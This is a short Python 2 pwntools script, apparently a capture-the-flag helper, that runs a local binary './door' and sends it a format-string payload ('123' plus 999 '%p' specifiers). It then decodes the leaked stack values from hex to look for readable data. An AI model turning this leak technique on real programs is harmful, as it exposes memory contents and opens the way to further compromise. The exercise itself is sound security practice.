#python2
from __future__ import print_function
from pwn import *


print("ord of A hex: "+str(hex(ord("A"))))

io = process("./door")
io.recvuntil("A landslide has blocked the way at")
io.recvuntil("0x")
addr = io.recvline().strip()
print("addr: "+addr)

'''
At address, the value is: str("9447")
In stack, str("7449")
'''

pad = "123"+"%p"*999
io.sendline(pad)

io.recvuntil("You say, ")
k = 0

inb = io.recvline()

soup = inb.replace("0x", "|")
soup = soup.replace("(nil)", "|nil")

inarr = soup.split("|")
for item in inarr:
	print(str(k), end=': ')
	print(item, end='')
	
	try:
		buf = item.decode("hex")
		print('-> '+buf, end='')
	except Exception, e:
		pass
	
	print()
	
	k = k + 1
	
	
